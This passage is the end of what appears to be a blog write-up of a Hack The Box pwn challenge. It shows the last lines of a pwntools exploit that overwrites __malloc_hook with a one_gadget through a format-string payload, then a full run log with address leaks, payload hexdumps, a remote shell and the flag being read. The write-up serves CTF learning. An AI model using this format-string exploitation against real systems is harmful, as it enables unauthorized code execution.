<span class="number">0x4f322</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Taking control of exeuction flow - overriding __malloc_hook with one_gadget ---</span></span><br><span class="line">p.sendline(fmtstr_payload(<span class="number">6</span>, &#123; malloc_hook_addr: one_gadget &#125;))</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&#x27;%100000c&#x27;</span>) <span class="comment"># __malloc_hook trigger</span></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/challenge/pwn/format]</span><br><span class="line">└─<span class="comment"># python pwnexp.py </span></span><br><span class="line">[*] <span class="string">&#x27;/root/hackthebox/challenge/pwn/format/format&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] <span class="string">&#x27;/root/hackthebox/challenge/pwn/format/libc-2.27.so&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Opening connection to 188.166.173.208 on port 31941: Done</span><br><span class="line">[DEBUG] Sent 0x6 bytes:</span><br><span class="line">    <span class="string">&#x27;%37$p\n&#x27;</span></span><br><span class="line">[DEBUG] Received 0xf bytes:</span><br><span class="line">    <span class="string">&#x27;0x55ad927bd26d\n&#x27;</span></span><br><span class="line">[+] LEAK =&gt; (init+117) address: 0x55ad927bd26d</span><br><span class="line">[*] Base ELF address: 0x55ad927bc000</span><br><span class="line">[*] <span class="built_in">printf</span>@got.plt address: 0x55ad927bffc0</span><br><span class="line">[DEBUG] Sent 0x11 bytes:</span><br><span class="line">    00000000  41 41 41 41  25 37 24 73  c0 ff 7b 92  ad 55 00 00  │AAAA│%7<span class="variable">$s</span>│··&#123;·│·U··│</span><br><span class="line">    00000010  0a                                                  │·│</span><br><span class="line">    00000011</span><br><span class="line">[DEBUG] Received 0x10 bytes:</span><br><span class="line">    00000000  41 41 41 41  80 4e 3f 41  5f 7f c0 ff  7b 92 ad 55  │AAAA│·N?A│_···│&#123;··U│</span><br><span class="line">    00000010</span><br><span class="line">[+] Leaked __printf: 0x7f5f413f4e80</span><br><span class="line">[DEBUG] Sent 0x79 bytes:</span><br><span class="line">    00000000  25 33 34 63  25 31 35 24  6c 6c 6e 25  32 37 63 25  │%34c│%15$│lln%│27c%│</span><br><span class="line">    00000010  31 36 24 68  68 6e 25 34  63 25 31 37  24 68 68 6e  │16<span class="variable">$h</span>│hn%4│c%17│<span class="variable">$hhn</span>│</span><br><span class="line">    00000020  25 33 30 63  25 31 38 24  68 68 6e 25  33 32 63 25  │%30c│%18$│hhn%│32c%│</span><br><span class="line">    00000030  31 39 24 68  68 6e 25 31  31 36 63 25  32 30 24 68  │19<span class="variable">$h</span>│hn%1│16c%│20<span class="variable">$h</span>│</span><br><span class="line">    00000040  68 6e 61 61  61 61 62 61  30 bc 77 41  5f 7f 00 00  │hnaa│aaba│0·wA│_···│</span><br><span class="line">    00000050  32 bc 77 41  5f 7f 00 00  33 bc 77 41  5f 7f 00 00  │2·wA│_···│3·wA│_···│</span><br><span class="line">    00000060  34 bc 77 41  5f 7f 00 00  35 bc 77 41  5f 7f 00 00  │4·wA│_···│5·wA│_···│</span><br><span class="line">    00000070  31 bc 77 41  5f 7f 00 00  0a                        │1·wA│_···│·│</span><br><span class="line">    00000079</span><br><span class="line">[DEBUG] Received 0xff bytes:</span><br><span class="line">    00000000  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │</span><br><span class="line">    *</span><br><span class="line">    00000020  20 b0 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │ ·  │    │    │    │</span><br><span class="line">    00000030  20 20 20 20  20 20 20 20  20 20 20 20  d0 20 20 20  │    │    │    │·   │</span><br><span class="line">    00000040  81 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │·   │    │    │    │</span><br><span class="line">    00000050  20 20 20 20  20 20 20 20  20 20 20 20  20 20 c0 20  │    │    │    │  · │</span><br><span class="line">    00000060  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │</span><br><span class="line">    00000070  20 20 20 20  20 20 20 20  20 20 20 20  20 20 c0 20  │    │    │    │  · │</span><br><span class="line">    00000080  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │</span><br><span class="line">    *</span><br><span class="line">    000000f0  20 20 25 61  61 61 61 62  61 30 bc 77  41 5f 7f     │  %a│aaab│a0·w│A_·│</span><br><span class="line">    000000ff</span><br><span class="line">[DEBUG] Sent 0x9 bytes:</span><br><span class="line">    <span class="string">&#x27;%100000c\n&#x27;</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ <span class="built_in">id</span></span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    <span class="string">&#x27;id\n&#x27;</span></span><br><span class="line">[DEBUG] Received 0x2a bytes:</span><br><span class="line">    <span class="string">&#x27;uid=999(ctf) gid=999(ctf) groups=999(ctf)\n&#x27;</span></span><br><span class="line">uid=999(ctf) gid=999(ctf) <span class="built_in">groups</span>=999(ctf)</span><br><span class="line">$ <span class="built_in">whoami</span></span><br><span class="line">[DEBUG] Sent 0x7 bytes:</span><br><span class="line">    <span class="string">&#x27;whoami\n&#x27;</span></span><br><span class="line">[DEBUG] Received 0x4 bytes:</span><br><span class="line">    <span class="string">&#x27;ctf\n&#x27;</span></span><br><span class="line">ctf</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    <span class="string">&#x27;ls\n&#x27;</span></span><br><span class="line">[DEBUG] Received 0x21 bytes:</span><br><span class="line">    <span class="string">&#x27;flag.txt\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;format\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;run_challenge.sh\n&#x27;</span></span><br><span class="line">flag.txt</span><br><span class="line">format</span><br><span class="line">run_challenge.sh</span><br><span class="line">$ <span class="built_in">cat</span> flag.txt</span><br><span class="line">[DEBUG] Sent 0xd bytes:</span><br><span class="line">    <span class="string">&#x27;cat flag.txt\n&#x27;</span></span><br><span class="line">[DEBUG] Received 0x1e bytes:</span><br><span class="line">    <span class="string">&#x27;HTB&#123;mall0c_h00k_f0r_th3_w1n!&#125;\n&#x27;</span></span><br><span class="line">HTB&#123;mall0c_h00k_f0r_th3_w1n!&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/format31.jpg"></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2021/01/12/format/" title="Hack-The-Box-pwn-challenge[Format]">https://fdlucifer.github.io/2021/01/12/format/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i> pwn</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/01/12/delivery/" rel="prev" title="Hack-The-Box-walkthrough[Delivery]">
+                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[Delivery]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/01/15/cereal/" rel="next" title="Hack-The-Box-walkthrough[Cereal]">
+                  Hack-The-Box-walkthrough[Cereal] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
